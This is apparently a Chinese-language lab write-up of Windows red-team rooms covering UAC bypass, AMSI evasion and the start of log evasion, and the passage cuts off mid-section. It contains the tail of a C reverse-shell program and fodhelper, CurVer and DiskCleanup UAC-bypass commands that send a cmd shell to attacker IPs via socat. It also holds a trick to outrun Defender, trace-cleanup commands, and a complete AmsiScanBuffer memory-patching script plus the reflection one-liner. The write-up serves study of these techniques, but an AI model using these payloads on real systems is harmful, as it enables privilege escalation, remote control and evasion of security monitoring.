sinfo.cb = sizeof(sinfo); sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket; CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &amp;sinfo, &amp;pinfo); printf(&quot;Process Created %lu\\\\n&quot;, pinfo.dwProcessId); WaitForSingleObject(pinfo.hProcess, INFINITE); CloseHandle(pinfo.hProcess); CloseHandle(pinfo.hThread); } } int main(int argc, char **argv) { if (argc == 3) { int port = atoi(argv[2]); RunShell(argv[1], port); } else { char host[] = &quot;10.2.2.106&quot;; int port = 4444; RunShell(host, port); } return 0; } 最后可以用 strip 跑一遍，丢到 VT 上扫一下，检出率很低 试想一下，如果用这种技术去造一个 Shellcode 加载器，用动态加载 + 函数名混淆 + shellcode 签名混淆 + 壳，过静态应该问题不大，容易检测的点都给他过了，要针对的就只是内存扫描了。 Bypassing UAC 绕过 UAC之前在完成一些房间的时候接触到了老系统通过证书的 URL 来提权，这个房间详细介绍了现在可用的提权手段，是利用了 Windows 的 “feature”。 UAC 的概念UAC 是一个 Windows 的安全特性，默认情况下强制任何新进程以非特权帐户的安全上下文运行。该策略适用于任何用户启动的进程，包括管理员本人。其理念是我们不能仅依赖用户的身份来判断某些操作是否应被授权。 UAC 并没有把管理员账户变成普通账户，而是改变了程序运行时的默认权限。 没有 UAC 的时代：只要你用管理员身份登录，你运行的任何程序都自动拥有管理员的全部权限。 有了 UAC 之后：默认情况下，你启动的任何程序（包括由管理员本人启动的）都只被赋予非特权账户的权限。这意味着，它无法随意修改系统文件、注册表等关键区域。 当一个程序需要执行一个可能影响系统的操作时（比如安装软件），UAC 会弹出一个权限确认窗口。只有当管理员**亲自点击“是”**来授权后，这个程序才能临时获得管理员权限，完成特定任务。 Integrity Levels 完整性级别UAC 是一种强制完整性控制（Mandatory Integrity Control (MIC)），它通过为用户、进程和资源中的每一项分配一个完整性级别（IL）来实现区分。一般来说，具有更高 IL 的用户或进程访问令牌将能够访问具有较低或相等 IL 的资源。MIC 优先于常规的 Windows DACL，因此即便根据 DACL 你被授权访问某个资源，如果你的 IL 不够高也无济于事。 完整性级别 用途 Low 通常用于与互联网交互（例如 Internet Explorer）。权限非常有限。 Medium 分配给标准用户和管理员的受限令牌。 High 在启用 UAC 时由管理员的提升令牌使用。如果 UAC 被禁用，所有管理员将始终使用高完整性级别（High IL）令牌。 System 预留给系统使用 Filtered Tokens 受限令牌为实现这种角色分离，UAC 在登录时以略有不同的方式对待普通用户和管理员： 非管理员用户会在登录的时候收到一个访问令牌，该令牌将用于用户执行的所有任务。该令牌具有 Medium IL。 管理员用户会收到两个访问令牌 受限令牌：已被剥夺管理员权限的令牌，用于常规操作，该令牌具有 Medium IL。 提升令牌：一个拥有完全管理员权限的令牌，用于需要管理员权限运行的东西，该令牌具有 High IL。 总而言之，管理员在日常使用中会使用受限令牌，除非他们通过 UAC 请求提升权限。 通过正常方式打开应用程序图1是正常打开应用程序的 Token，图2是通过管理员权限打开的。可以看到左边的是 Medium IL，右边的是 High IL，拥有的权限也更多。 UAC 的设定UAC 可以配置为以下四种不同的通知级别： 始终通知： 当程序试图安装应用或对计算机进行更改时，以及你手动修改 Windows 设置时，UAC 都会弹出通知并要求授权。这是最严格、最安全的设置。 仅在程序试图对我的计算机进行更改时通知 (默认设置)： 当程序试图安装应用或对计算机进行更改时，UAC 会弹出通知并要求授权。但如果你是管理员，手动更改 Windows 设置（例如，更改日期和时间）则不会触发 UAC 提示。 仅在程序试图对我的计算机进行更改时通知 (不调暗桌面)： 功能和上一个级别相同，但弹出 UAC 提示时不会调暗桌面。这会牺牲一部分安全性，因为恶意软件理论上有机会在提示窗口上模拟点击。 从不通知： 禁用 UAC 提示。在这种模式下，管理员运行的所有程序都会默认获得最高权限，这与没有 UAC 时的行为相同。这是最不安全的设置，不推荐使用。 实际上只有两个档然而在微软的 Raymond Chen（陈瑞孟）在 There are really only two effectively distinct settings for the UAC slider 一文中说实际上只有两个档： 始终通知 辣鸡 src: https://blog.walterlv.com/post/there-are-only-two-settings-for-the-uac-slider.html UAC 内部原理UAC 的核心，是应用程序信息服务（Application Information Service，或称 Appinfo）。每当用户需要提升权限时，会发生以下情况： 用户请求以管理员身份运行应用程序。 使用 runas 语法调用 ShellExecute API。 请求被转发到 Appinfo 处理提升。 应用程序 manifest 会被检查，以确定是否允许自动提升（稍后详述）。 Appinfo 会执行 consent.exe，在安全桌面上显示 UAC 提示。安全桌面只是一个独立的桌面，它将进程与实际用户桌面上运行的进程隔离开来，以避免其他进程以任何方式篡改 UAC 提示。 如果用户同意以管理员身份运行应用程序，Appinfo 服务将使用用户的提升令牌执行请求。然后，Appinfo 将设置新进程的父进程 ID，使其指向请求提升的 shell。 绕过 UACUAC 与权限的假象 权限受限：即使攻击者通过管理员账户获得了远程 shell（例如 PowerShell），他们也无法直接执行 net user /add 等管理任务。这是因为 UAC 强制所有新进程（包括管理员自己的进程）以**中等完整性级别（Medium IL）**运行，这是一种权限受限的模式。 受限令牌：whoami /groups 命令的输出显示，该会话正在使用一个受限令牌，这意味着它虽然属于 Administrators 组，但却没有执行管理任务的权限。 目标：绕过 UAC：为了获得**高完整性级别（High IL）**的完全控制权限，攻击者必须绕过 UAC。 微软对 UAC 的态度 不是安全边界：微软并不将 UAC 视为一种安全边界，而是将其定位为一种方便管理员的提醒工具。它旨在防止用户在不知情的情况下运行高权限进程。 非漏洞：由于 UAC 不是安全边界，微软认为任何绕过 UAC 的技术都不算作漏洞，因此很多已知的绕过方法至今仍未被修补。 UAC 绕过的通用方法 利用高完整性级别进程：大多数 UAC 绕过技术都利用一个已经以高完整性级别运行的合法父进程，来执行攻击者的代码。 权限继承：一个由高完整性级别父进程创建的新进程，会自动继承相同的完整性级别。攻击者正是利用这一点，在不触发 UAC 提示的情况下，获得一个高权限的 shell。 攻击者的目标是利用操作系统自身的信任机制，通过一个合法的、高权限的父进程，来获得一个完全控制的 shell，从而实现 UAC 绕过。 基于 GUI 的绕过msconfig通过运行 msconfig，可以在不触发 UAC 的情况下获得一个 High IL，然后可以在 Tools 选项卡里打开 cmd，这个新运行的 cmd 会继承 msconfig 同样的访问令牌，这样你就有了一个具有 High IL 的 cmd 了。 这是通过一个称为“自动提升”的功能实现的，该功能允许特定二进制文件在不需要用户交互的情况下提升权限。 azman.msc同样是 Win + R 运行，这里打开之后找到菜单栏 -&gt; 帮助 -&gt; 在弹出窗口里面点击查看源码，然后会打开默认的 notepad 应用，然后在 notepad 里面打开文件的时候运行 cmd，这样你就有了一个具有 High IL 的 cmd 了。 自动提权的进程之前提到某些可执行程序能在不需要用户交互的情况下自动提升到 High IL，这适用于控制面板的大部分功能以及 Windows 附带的一些可执行文件。 对于应用程序，自动提权需要满足一些要求： 可执行文件必须由 Windows Publisher 签名 可执行文件必须包含在受信任的目录中，如 %SystemRoot%/System32/ 或 %ProgramFiles%/ 根据应用程序的类型，可能会有其他要求： 可执行文件 (.exe) 必须在其清单中声明 autoElevate 元素。要检查文件的清单，我们可以使用 Sysinternals 套件提供的工具 sigcheck。如果我们检查 msconfig.exe 的 manifest，就会发现 autoElevate 属性： 12345678C:\\tools\\&gt; sigcheck64.exe -m c:/windows/system32/msconfig.exe ... &lt;asmv3:application&gt; &lt;asmv3:windowsSettings xmlns=&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;&gt; &lt;dpiAware&gt;true&lt;/dpiAware&gt; &lt;autoElevate&gt;true&lt;/autoElevate&gt; &lt;/asmv3:windowsSettings&gt; &lt;/asmv3:application&gt; mmc.exe 将根据用户请求的 .msc 快速插件自动提升。Windows 附带的大多数 .msc 文件都会自动提升。 Windows 还保留了一个额外的可执行文件列表，这些可执行文件即使未在清单中请求，也会自动提升级别。该列表包括 pkgmgr.exe 和 spinstall.exe。 COM 对象也可以通过配置某些注册表键值来请求自动提升 (https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)。 FodhelperFodhelper.exe 是 Windows 的一个默认可执行文件，负责管理 Windows 可选功能，包括额外语言、未默认安装的应用程序或其他操作系统特性。fodhelper 在使用默认 UAC 设置时可以自动提升权限，但与 msconfig 不同，fodhelper 可以在不访问 GUI 的情况下被滥用。 从攻击者的角度来看，这意味着它可以通过中等完整性远程 shell 使用，并提升为完全功能的高完整性进程。这个特定技术由 @winscripting 发现，并曾被 Glupteba 恶意软件在野使用。 fodhelper 会在注册表中搜索一个键，通过 Process Monitor 可以看到： 当 Windows 打开一个文件时，它会检查注册表以确定应使用哪个应用程序。注册表为每种文件类型保存一个称为程序标识符（ProgID）的键，其中关联了相应的应用程序。比如你尝试打开一个 HTML 文件。系统会检查名为 HKEY_CLASSES_ROOT 的注册表部分，以便知道必须使用你首选的网页客户端来打开它。要使用的命令将在每个文件 ProgID 的 shell/open/command 子键下指定。以 “htmlfile” ProgID 为例： 实际上，HKEY_CLASSES_ROOT 只是注册表中两条不同路径的合并视图： Path Description HKEY_LOCAL_MACHINE\\Software\\Classes 系统范围文件关联 HKEY_CURRENT_USER\\Software\\Classes 活动用户的文件关联 在检查 HKEY_CLASSES_ROOT 时，如果在 HKEY_CURRENT_USER（HKCU）下存在用户特定的关联项，则优先使用用户的。如果未配置用户特定的关联项，则会改为使用 HKEY_LOCAL_MACHINE（HKLM）下的全局关联项。 当 fodhelper.exe 运行时，它会尝试调用 ms-settings: 协议来打开一个设置页面。它会去注册表查找这个协议的默认处理程序，我们可以在当前用户的 HKCU 中为这个 ProgID 创建一个关联，就会覆盖掉系统的默认关联。因为 fodhelper 是自动提权的，所以它启动的任何子进程都将继承高完整性令牌。 实践这个房间给的主机已经埋了一个后门，我们用 nc 连进去： 123456789101112131415161718nc 10.201.63.248 9999 # 查看当前的 IL C:\\Windows\\system32&gt;whoami /groups | find &quot;Label&quot; Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 # 指定要修改的注册表 set REG_KEY=HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command # 要执行的命令 set CMD=&quot;powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:10.11.141.2:4444 EXEC:cmd.exe,pipes&quot; # 禁用默认的执行委托 reg add %REG_KEY% /v &quot;DelegateExecute&quot; /d &quot;&quot; /f # 新建一个键 内容是我们要执行的命令 reg add %REG_KEY% /d %CMD% /f # 执行 fodhelper 就拿到 High IL 的 Shell 了 fodhelper.exe 实际上你通过观察注册表会发现，HKCU 下的 ms-settings 是没有任何东西的，但是 fodhelper.exe 会优先检索 HKCU 下的 \\Software\\Classes\\ms-settings\\Shell\\Open\\command。我们通过把他的执行命令改了，弹一个 shell 回我们的机器，因为他是用高权限执行的，所以拿到的也是 High IL。 如果你只修改 command 键，而不去动 DelegateExecute，你的攻击链就会失败。这是因为 DelegateExecute 的优先级更高。 Windows 在处理 ms-settings 协议时，遵循一个严格的优先级： 首先检查 DelegateExecute：操作系统或 fodhelper.exe 进程会首先检查 command 键下是否存在 DelegateExecute 这个值。 执行委托：如果 DelegateExecute 存在且包含有效数据，它就会立即将执行权委托给该值所指向的程序。此时，command 键下设置的任何命令都会被完全忽略，即使你填入了恶意代码，它也不会被执行。 退回执行：只有当 DelegateExecute 不存在或其值为空字符串时，操作系统才会“退回”并执行 command 键下的命令。 清理痕迹用这一行命令删掉我们在 HKCU 下写的注册表就行了，系统会回去调用 HKLM 的项。 1reg delete HKCU\\Software\\Classes\\ms-settings\\ /f 绕过 WD刚刚是在 WD 关掉的情况下操作的，所以问题不大，那如果 WD 打开的话，在插入 HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command 的时候就会报毒了 12345678set REG_KEY=HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command set CMD=&quot;powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:10.11.141.2:4444 EXEC:cmd.exe,pipes&quot; reg add %REG_KEY% /v &quot;DelegateExecute&quot; /d &quot;&quot; /f reg add %REG_KEY% /d %CMD% /f # 查看被删除的注册表 reg query %REG_KEY% /v &quot;&quot; 不过这里可以发现 WD 删除注册表是要时间的，如果我们在写入注册表之后马上执行，那么一样能拿到 shell。 1reg add %REG_KEY% /d %CMD% /f &amp; fodhelper.exe 利用 CurVer 劫持 UAC@V3ded 提出了一种对 fodhelper 漏洞利用的变种，使用了不同的注册表键，但基本原理相同。 这个复杂的 UAC 绕过技术不再直接修改 ms-settings 的命令键，而是利用了一个更为隐蔽的机制：ProgID 的 CurVer 条目。 攻击原理：利用版本重定向 CurVer（Current Version，当前版本）是 Windows 设计用来在系统中管理同一应用的多个不同版本时使用的。它允许一个 ProgID 指向应用的最新或默认版本。当 Windows 需要打开一个文件或执行某个协议时，它会首先检查 CurVer 条目，然后根据该条目的指引去寻找实际的执行命令。 攻击者正是利用了这个重定向功能来欺骗 fodhelper.exe。 攻击步骤 设置陷阱：攻击者首先在注册表中创建一个全新的 ProgID（可以随意命名）。这个新的 ProgID 包含了攻击者的恶意命令。 制造重定向：然后，攻击者将合法的 ms-settings ProgID 的 CurVer 条目修改为指向这个新创建的 ProgID。 触发执行：当 fodhelper.exe 运行时，它会像往常一样，通过 ms-settings ProgID 来寻找要执行的命令。但这次，它会首先遇到 CurVer 条目，并被重定向到我们伪造的 ProgID。 执行恶意代码：最终，fodhelper.exe 会检查我们这个新 ProgID 的配置，并在完全没有 UAC 提示的情况下，执行我们预先设置好的恶意命令。 12345678$program = &quot;powershell -windowstyle hidden C:\\tools\\socat\\socat.exe TCP:10.6.4.118:4445 EXEC:cmd.exe,pipes&quot; New-Item &quot;HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command&quot; -Force Set-ItemProperty &quot;HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command&quot; -Name &quot;(default)&quot; -Value $program -Force New-Item -Path &quot;HKCU:\\Software\\Classes\\ms-settings\\CurVer&quot; -Force Set-ItemProperty &quot;HKCU:\\Software\\Classes\\ms-settings\\CurVer&quot; -Name &quot;(default)&quot; -value &quot;.pwn&quot; -Force Start-Process &quot;C:\\Windows\\System32\\fodhelper.exe&quot; -WindowStyle Hidden 用 PowerShell 执行会报毒，但是 cmd 不会，因为杀毒软件采用的检测方法是严格针对已公开的利用方式实现的。 1234567891011set CMD=&quot;powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:10.6.4.118:4445 EXEC:cmd.exe,pipes&quot; reg add &quot;HKCU\\Software\\Classes\\.thm\\Shell\\Open\\command&quot; /d %CMD% /f reg add &quot;HKCU\\Software\\Classes\\ms-settings\\CurVer&quot; /d &quot;.thm&quot; /f fodhelper.exe # 清理痕迹 reg delete &quot;HKCU\\Software\\Classes\\.thm\\&quot; /f reg delete &quot;HKCU\\Software\\Classes\\ms-settings\\&quot; /f 绕过最高级的 UAC在默认的 Windows 配置下，你可以滥用与系统配置相关的应用程序来绕过 UAC，因为这些应用的大多数在其清单中设置了 autoElevate 标志。然而，如果 UAC 被配置为“始终通知”级别，它们在提升权限时会要求用户通过 UAC 提示，无法绕过。 但是并不是没有办法，可以使用计划任务绕过这点限制，任何需要提升权限的计划任务都会自动获得提升。 案例研究：磁盘清理计划任务在这里我们可以看到该任务被配置为以“Users”帐户运行，这意味着它会继承调用者的权限。“以最高权限运行”选项将使用调用者可用的最高权限安全令牌，对于管理员而言这是一个高完整性级别（IL）的令牌。请注意，如果普通非管理员用户调用此任务，它将只以中等完整性级别（medium IL）执行，因为那是非管理员可用的最高权限令牌，因此绕过将无法生效。 查看“操作”和“设置”选项卡，我们得到以下内容： 该任务可以按需运行，在调用时执行以下命令： %windir%\\system32\\cleanmgr.exe /autoclean /d %systemdrive% 由于该命令依赖于环境变量，我们可以注入命令到这些变量中，并通过手动启动磁盘清理任务使其被执行。 我们可以通过在注册表中创建一个条目来覆盖 %windir% 变量，路径为 HKCU\\Environment 。如果我们想使用 socat 执行反向 shell，可以将 %windir% 设置为如下（不含引号）： 1cmd.exe /c C:\\tools\\socat\\socat.exe TCP:10.6.4.118:4445 EXEC:cmd.exe,pipes &amp;REM 在我们的命令末尾，我们拼接 “&amp;REM “（以空格结尾），以便在展开环境变量时注释掉放在 %windir% 之后的任何内容，从而得到 DiskCleanup 使用的最终命令。最终拼接后生成的命令如下： 1cmd.exe /c C:\\tools\\socat\\socat.exe TCP:10.6.4.118:4445 EXEC:cmd.exe,pipes &amp;REM \\system32\\cleanmgr.exe /autoclean /d %systemdrive% 拿到 shell 之后执行修改注册表的环境变量 1234567reg add &quot;HKCU\\Environment&quot; /v &quot;windir&quot; /d &quot;cmd.exe /c C:\\tools\\socat\\socat.exe TCP:10.6.4.118:4446 EXEC:cmd.exe,pipes &amp;REM &quot; /f # 执行计划任务 schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I # 删除痕迹 reg delete &quot;HKCU\\Environment&quot; /v &quot;windir&quot; /f 自动绕过 UAC手动弄了那么多，现在有自动化的方法。UACME 提供了多个工具可以供你测试绕过 UAC。 这个房间主要专注于名为 Akagi 的那个，使用该工具很简单，只需指出要测试的方法对应的编号即可。 如果你想测试方法 33，可以在命令提示符中执行以下操作，然后会弹出一个高完整性（high integrity）的 cmd.exe： 1UACME-Akagi64.exe 33 本房间中介绍的方法也可以通过 UACME 使用以下方法进行测试： Method Id Bypass technique 33 fodhelper.exe 34 DiskCleanup scheduled task 70 fodhelper.exe using CurVer registry key 测试了挺多的，提供的靶机挺多都可以用，工具的文档也挺详细，就是要自己编译。 更多资源 UACME github repository Bypassing UAC with mock folders and DLL hijacking UAC bypass techniques detection strategies Reading your way around UAC Runtime Detection Evasion这个房间主要是讲绕 AMSI 的，我觉得标题应该取成 Script or PowerShell Runtime Detection Evasion，因为这整个房间都是围绕 PowerShell 的。 AMSI 概要Windows 反恶意软件扫描接口（AMSI）是一种通用的接口标准，允许应用程序和服务与计算机上的任何反恶意软件产品集成。 文档 AMSI 会根据监控或者扫描得到的状态码确定他的行为，下面是可能的状态码： AMSI_RESULT_CLEAN &#x3D; 0 AMSI_RESULT_NOT_DETECTED &#x3D; 1 AMSI_RESULT_BLOCKED_BY_ADMIN_START &#x3D; 16384 AMSI_RESULT_BLOCKED_BY_ADMIN_END &#x3D; 20479 AMSI_RESULT_DETECTED &#x3D; 32768 这些状态码通过 AMSI 的后端或者第三方的实现才能看到。如果 AMSI 检测出一个威胁的结果，他会停止执行然后发送错误消息。 下列 Windows 组件集成了 AMSI ： User Account Control, or UAC PowerShell Windows Script Host (wscript and cscript) JavaScript and VBScript Office VBA macros AMSI 插桩AMSI 的插桩方式有点复杂，他包含了大量的 DLL ，根据插桩的地方不同，有不同的执行策略。根据定义，AMSI 只是其他反恶意软件产品的一个接口，AMSI 会根据正在执行的内容以及其执行的层级，使用多个提供程序 DLL 和 API 调用。 System.Management.Automation.dll（即 PowerShell 的核心）被 AMSI 所插桩，这是一个由 Windows 开发的 .NET assembly；根据微软文档，“程序集构成了基于 .NET 的应用程序在部署、版本控制、重用、激活范围和安全权限方面的基本单元。”该 .NET assembly 会根据解释器以及代码是在磁盘上还是在内存中，对其他 DLL 和 API 调用进行插桩。下图描述了数据在各层流动时如何被分解以及哪些 DLL&#x2F;API 调用被插装。 在上图中，数据将根据所使用的解释器（PowerShell&#x2F;VBScript&#x2F;等）进行处理。随着数据在模型各层向下传递，各种 API 调用和接口都会被插桩。理解 AMSI 的完整模型很重要，但我们可以将其拆解为核心组件，如下图所示。 注意：AMSI 只有在代码被通用语言运行时（CLR）在内存中执行时才开始扫描。因为代码如果在硬盘上，WD 就会扫描他，所以 AMSI 是在这个场景下才扫描的。理解成 WD 静态扫描，AMSI 动态扫描就行。 要查找 PowerShell 被 AMSI 插桩的位置，我们可以使用 Cobbr 维护的 InsecurePowerShell。InsecurePowerShell 是一个移除安全功能的 PowerShell 的 GitHub 分支，我们可以查看 commit 发现更改的地方。AMSI 仅在 src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs 下的十二行代码中被插桩。这十二行代码如下所示。 1234567891011var scriptExtent = scriptBlockAst.Extent; if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED) { var parseError = new ParseError(scriptExtent, &quot;ScriptContainedMaliciousContent&quot;, ParserStrings.ScriptContainedMaliciousContent); throw new ParseException(new[] { parseError }); } if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null) { HasSuspiciousContent = true; } 绕过 AMSIPowerShell 降级PowerShell 降级攻击是一个唾手可得的手段，允许攻击者修改当前的 PowerShell 版本以移除安全功能。 大多数 PowerShell 会话会启动最近的 PowerShell 引擎，但是攻击者能通过一行命令去修改他的版本。PowerShell 的安全特性是在 5.0 版本才实现的，所以可以绕过这些安全特性。 12# 通过 -Version 指定版本 PowerShell -Version 2 Unicorn 是利用这种攻击的一个例子，因为这种攻击门槛很低，可以通过移除 PowerShell 2.0 引擎和其他的方法去解决他。 123full_attack = &#39;&#39;&#39;powershell /w 1 /C &quot;sv {0} -; sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString()); powershell (gv {5}).value.toString() (\\\\&#39;&#39;&#39;&#39;.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + &quot;)&quot; + &#39;&quot;&#39; PowerShell 反射反射允许用户或者管理员直接访问 .Net 程序集和交互，PowerShell 反射可被滥用来修改并识别有价值 DLL 中的信息。 PowerShell 的 AMSI 存储在位于 System.Management.Automation.AmsiUtils 的 AMSIUtils .NET 程序集中。 Matt Graeber 用一行命令就可以通过反射来修改并绕过 AMSI 。下面的代码块展示了这一行命令。 12345678910[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) # 1.调用反射函数并指定它要使用来自 [Ref.Assembly] 的程序集，然后它将使用 GetType 获取类型 [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;) # 2.从上一节收集的信息将被转发到下一个函数，以使用 GetField 在程序集内获取指定字段 .GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;) # 3.然后程序集和字段信息将被转发到下一个参数，以使用 SetValue 将值从 $false 设置为 $true .SetValue($null,$true) 一旦 amsiInitFailed 字段被设置为 $true ，AMSI 将返回响应代码：AMSI_RESULT_NOT_DETECTED &#x3D; 1 修补 AMSIAMSI 会插桩到 System.Management.Automation.dll（即 PowerShell 的核心）这里去调用 amsi.dll；但是这个 dll 可以被操纵，让他强制指向我们想要的一个响应代码。这个 DLL 里面有一个叫 AmsiScanBuffer 的函数，它会扫描一段疑似代码的 “buffer”，并将其报告给 amsi.dll 拿到结果。假设我们可以控制此函数并用一个干净的返回代码覆盖该缓冲区，是不是就能绕过了？ AmsiScanBuffer 脆弱的原因是因为 amsi.dll 是加载到 PowerShell 进程的，但是我们的会话具有与该程序相同的权限级别。 我们将分析 BC-Security 受 Tal Liberman 启发而修改的代码片段；你可以在这里找到原始代码。RastaMouse 也有一个用 C# 编写的类似旁路，使用了相同的技术；你可以在这里找到代码。 从宏观上看，AMSI 修补可以分为四个步骤： 获取 amsi.dll 的句柄 获取 AmsiScanBuffer 的进程地址 修改 AmsiScanBuffer 的内存保护 向 AmsiScanBuffer 写入操作码 我们首先需要加载要使用的外部库和 API，通过 p&#x2F;invoke 从 kernel32 加载 GetProcAddress、GetModuleHandle 和 VirtualProtect。 123456789101112131415161718[DllImport(`&quot;kernel32`&quot;)] // 导入提供 API 的 DLL public static extern IntPtr GetProcAddress( // 要导入的 API IntPtr hModule, // DLL 模块的句柄 string procName // 要获得的方法或者变量 ); [DllImport(`&quot;kernel32`&quot;)] public static extern IntPtr GetModuleHandle( string lpModuleName // 要获得模块的句柄 ); [DllImport(`&quot;kernel32`&quot;)] public static extern bool VirtualProtect( IntPtr lpAddress, // 修改内存区域的地址 UIntPtr dwSize, // 区域大小 uint flNewProtect, // 内存保护选项 out uint lpflOldProtect // 存储先前保护选项的指针 ); 现在函数已被定义，但我们需要使用 Add-Type 来加载这些 API。此 cmdlet 会将这些函数以适当的类型和 namespace 加载，从而允许调用这些函数。 1$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name &#39;Kernel32&#39; -NameSpace &#39;Win32&#39; -PassThru; 现在我们可以调用我们的 API 函数了，首先，我们需要使用 GetModuleHandle 来识别 AMSI 的进程句柄。然后将使用该句柄通过 GetProcAddress 来识别 AmsiScanBuffer 函数的内存地址。 1234567$handle = [Win32.Kernel32]::GetModuleHandle( &#39;amsi.dll&#39; // 获取 amsi.dll 的句柄 ); [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress( $handle, // amsi.dll 的句柄 &#39;AmsiScanBuffer&#39; // 函数的名称 ); 接下来，我们需要修改 AmsiScanBuffer 函数区域的内存保护。 123456789[UInt32]$Size = 0x5; // 区域大小 [UInt32]$ProtectFlag = 0x40; // 保护参数 PAGE_EXECUTE_READWRITE 读写权限 [UInt32]$OldProtectFlag = 0; // 存储老的保护参数 这里是占位符 [Win32.Kernel32]::VirtualProtect( $BufferAddress, // AmsiScanBuffer 的内存地址 $Size, // 区域大小 $ProtectFlag, // 对该区域开启读写权限 [Ref]$OldProtectFlag // 存储先前保护选项的指针 ); 我们需要指定要用什么覆盖该缓冲区；识别该缓冲区的过程可以在此处找到。一旦指定了缓冲区，就可以使用 marshal copy 将数据写入该进程。 12345678$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); [system.runtime.interopservices.marshal]::copy( $buf, // 要写入的 Opcodes/array 0, // 偏移量 $BufferAddress, // 写入位置 6 // 写入大小 ); 最终代码如下： 12345678910111213141516171819202122$MethodDefinition = &quot; [DllImport(`&quot;kernel32`&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(`&quot;kernel32`&quot;)] public static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport(`&quot;kernel32`&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); &quot;; $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name &#39;Kernel32&#39; -NameSpace &#39;Win32&#39; -PassThru; $handle = [Win32.Kernel32]::GetModuleHandle(&#39;amsi.dll&#39;); [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, &#39;AmsiScanBuffer&#39;); [UInt32]$Size = 0x5; [UInt32]$ProtectFlag = 0x40; [UInt32]$OldProtectFlag = 0; [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag); $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6); 现在 AMSI 已经被绕过了，但是他只在这个 PowerShell 会话中有效，原因前面说了，DLL 是加载到 PowerShell 进程里面的。 自动化工具amsi.failamsi.fail 可以从一个已知的绕过方式库里面编译并且生成一个 PowerShell 绕过脚本。 AMSI.fail 生成混淆的 PowerShell 片段，用于破坏或禁用当前进程的 AMSI。这些片段在混淆前会从一个小的技术&#x2F;变体池中随机选择。每个片段在运行时&#x2F;请求时都会被混淆，因此没有任何生成的输出会共享相同的特征签名。 把此绕过代码附加在恶意代码的开头，或者在执行恶意代码之前在同一会话中运行它。 AMSITrigger之前说过可以用 AMSITrigger 去检测我们的代码片段是否有会被检测的特征，这种绕过 AMSI 的方法比其他方法更稳定，因为你是在使文件本身变得“干净”。 参考资料反恶意软件扫描接口（AMSI）对抗学习 Evading Logging and Monitoring这个房间是讲留痕的问题，主要内容就是绕过 Windows 的那个日志记录，让影响最小化。 监控一般是从主机开始的，收集应用程序或者事件日志，日志一旦生成，可以保存在设备上或者发送到事件收集器&#x2F;采集器。一旦日志被从设备上取走，攻击者可能无法进行太多控制，但可以控制设备上的内容以及这些内容如何被采集。攻击者的主要目标是控制 ETW (Event Tracing for Windows)。 事件跟踪Windows 中几乎所有的事件记录功能在应用程序和内核层面都是由 ETW 处理的。虽然还有其他服务存在，比如事件记录（Event Logging）和跟踪记录（Trace Logging），但这些要么是 ETW 的扩展，要么对攻击者来说不那么常见。 组件 目的 控制器 构建并配置会话 提供者 产生事件 消费者 解释事件 因为 ETW 可以被检测者查看到，所以在渗透的过程中要始终注意可能产生的事件。对 ETW 采取的最佳办法是尽量减少对我们具体行为的记录，同时在不破坏环境完整性的前提下实施。 日志规避的方法删日志并不是一个好办法，在安全的最佳实践中，典型的现代环境中会有一个叫日志转发的机制。日志转发意味着 SOC 会将主机上的日志移动或“转发”到集中服务器。即使攻击者能够从主机上删除日志，这些日志也可能已经离开设备并被保护起来。 如果日志在转发前就已经全部被删除，或者这些日志根本没有被转发，那会不会引起警报？首先应该考虑到环境完整性，如果这个设备没有任何日志产生，那么就会引起严重怀疑。 Event ID 作用 1102 记录何时清除了 Windows 安全审计日志 104 记录何时清除了日志文件 1100 记录了 Windows 事件日志服务被关闭时的事件 上述事件 ID 可用于监控销毁日志或“日志破坏”的过程。这对试图篡改或销毁日志的攻击者构成了明显风险。尽管仍有可能进一步绕过这些缓解措施或篡改日志，但攻击者必须评估风险。在接触一个环境时，你通常不了解其安全措施，并且通过尝试这种方法会承担 OPSEC（Operational Security）风险。 事件跟踪实现Event Tracking for Windows（ETW）是一种强大的系统日志记录机制，它由三个相互独立的组件协同工作，共同管理和关联数据流。 事件提供程序 (Event Provider)： 功能： 这是事件的源头，负责生成事件。 工作原理： 